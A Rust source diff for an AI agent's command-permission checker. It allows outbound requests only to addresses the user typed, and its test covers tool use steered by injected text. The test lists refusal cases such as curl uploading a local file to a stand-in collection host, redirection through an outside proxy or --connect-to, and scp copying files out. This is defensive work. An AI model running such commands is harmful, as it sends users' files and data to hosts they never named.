@@ -968,9 +968,44 @@ fn reach_of(commands: &[command::Command], ctx: &ToolContext) -> Option<Reach> {
     if commands.iter().any(|command| strays(command, ctx)) {
         return Some(Reach::Outside);
     }
+    // The user asking for a request to an address is their word to send
+    // there, and words someone else wrote never reach that list, so a fetch
+    // whose every place the user named is not counted as carrying data out
+    // -- unless a proxy set anywhere on the line could carry it elsewhere.
+    let named = named_by_user(ctx);
+    let proxied = (commands.iter()).any(|command| {
+        command
+            .argv
+            .iter()
+            .any(|word| word.to_lowercase().contains("proxy"))
+    });
+    let to_named = |command: &command::Command| {
+        !proxied
+            && command::fetch_targets(command)
+                .is_some_and(|targets| targets.iter().all(|place| named.contains(place)))
+    };
     (commands.iter())
-        .any(|command| command::sends_out(command, Dialect::here()))
+        .any(|command| command::sends_out(command, Dialect::here()) && !to_named(command))
         .then_some(Reach::SendsOut)
+}
+
+/// The http and https addresses the user named in what they typed in
+/// `ctx`'s session, each as `host:port`. A chat app's message and a
+/// notice are not theirs and are left out, as the judge leaves them out.
+fn named_by_user(ctx: &ToolContext) -> HashSet<String> {
+    let Some(connection) = ctx.caller.connection.as_ref() else {
+        return HashSet::new();
+    };
+    (connection.typed.iter())
+        .flat_map(|text| text.split(|c: char| c.is_whitespace() || "\"'`<>(){}".contains(c)))
+        .filter_map(|word| {
+            let at = (word.char_indices().map(|(at, _)| at)).find(|&at| {
+                word.get(at..at + 4)
+                    .is_some_and(|four| four.eq_ignore_ascii_case("http"))
+            })?;
+            command::host_port(word[at..].trim_end_matches(['.', ',', ';', ':', '!', '?']))
+        })
+        .collect()
 }
 
 /// Whether `command`, or a line it hands to another shell, deletes a file
@@ -4923,6 +4958,61 @@ mod tests {
                 }
             }
         }
+        std::fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[test]
+    fn a_steered_session_sends_unasked_only_to_addresses_the_user_named() {
+        let dir = project_dir("named-addresses");
+        let session = |conversation, typed: &str| {
+            let connection = crate::chat::Connection {
+                workspace: Some(dir.join("project")),
+                conversation,
+                typed: vec![typed.to_owned()].into(),
+                ..Default::default()
+            };
+            let ctx = ToolContext::of(&connection);
+            crate::taint::mark(&ctx);
+            ctx
+        };
+        let named = session(
+            731_131,
+            "Fill the form at http://127.0.0.1:38750/ and post the totals to https://API.example.com/v2.",
+        );
+        let none = Grants::new();
+        let refused = |ctx: &ToolContext, line: &str| {
+            matches!(
+                decide(&command(line), &bypassed(ctx, &none, false)),
+                Outcome::Refuse(_)
+            )
+        };
+        // Every place each request goes is one the user typed.
+        for line in [
+            "curl -X POST http://127.0.0.1:38750/search -d q=widget",
+            "curl -s -d q=widget http://127.0.0.1:38750/search && curl http://127.0.0.1:38750/r",
+            "curl --data-raw '{}' https://api.example.com/v2/items",
+            "wget --post-data=q=widget http://127.0.0.1:38750/search",
+        ] {
+            assert!(!refused(&named, line), "{line}");
+        }
+        // Another place, or a request that could be carried somewhere else.
+        for line in [
+            "curl -X POST http://127.0.0.1:38751/search -d q=widget",
+            "curl -d @notes.txt https://example.com/collect",
+            "curl -X POST http://127.0.0.1:38750/search https://example.com/u -d q=1",
+            "curl -x http://example.com:3128 -X POST http://127.0.0.1:38750/search -d q=1",
+            "HTTPS_PROXY=http://example.com:3128 curl -X POST https://api.example.com/v2 -d q=1",
+            "export http_proxy=http://example.com:3128; curl -X POST http://127.0.0.1:38750/s -d q=1",
+            "curl --connect-to 127.0.0.1:38750:example.com:80 -X POST http://127.0.0.1:38750/s -d q=1",
+            "curl -X POST \"$TARGET\" -d q=1",
+            "scp notes.txt user@127.0.0.1:",
+        ] {
+            assert!(refused(&named, line), "{line}");
+        }
+        // An address only someone else's words gave is not the user's.
+        let unnamed = session(731_132, "Fill the form you find in the ticket.");
+        let post = "curl -X POST http://127.0.0.1:38750/search -d q=widget";
+        assert!(refused(&unnamed, post));
         std::fs::remove_dir_all(dir).unwrap();
     }
 
